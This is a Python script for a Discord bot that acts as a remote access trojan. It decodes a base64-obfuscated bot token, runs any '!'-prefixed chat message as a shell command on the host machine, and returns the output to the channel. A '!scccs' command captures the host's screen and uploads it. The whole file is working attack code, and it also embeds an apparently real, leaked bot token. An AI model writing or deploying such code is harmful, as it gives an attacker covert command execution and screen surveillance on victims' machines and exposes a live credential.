import discord
import subprocess
import pyautogui

import base64

encoded_text = "TVRJd016TTBOVGM0TVRJMk5UQXhORGd3TkEuR21za2xoLlRlRms4UnRrQzVqVWtmMnY4Q09DMU45ZmFTSkhrTjhjZ0phbzNV"
decoded_text = base64.b64decode(encoded_text).decode('utf-8')

# Replace 'YOUR_TOKEN' with your actual Discord bot token
TOKEN = decoded_text

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

# Initialize Discord client
client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')

@client.event
async def on_message(message):

    # Check if the message starts with a specific prefix (e.g., '!')
    if message.content.startswith('!'):
        # Extract the command from the message
        command = message.content[1:]
        if command == 'scccs':
            try:
                screenshot = pyautogui.screenshot()
                screenshot.save('screenshot.png')
                await message.channel.send(file=discord.File('screenshot.png'))
            except Exception as e:
                await message.channel.send(f'Error: {e}')
        else:
            # Run the command in the terminal
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                await message.channel.send(f'```\n{output}\n```')
            except Exception as e:
                await message.channel.send(f'Error: {e}')

# Run the bot with the specified token
client.run(TOKEN)
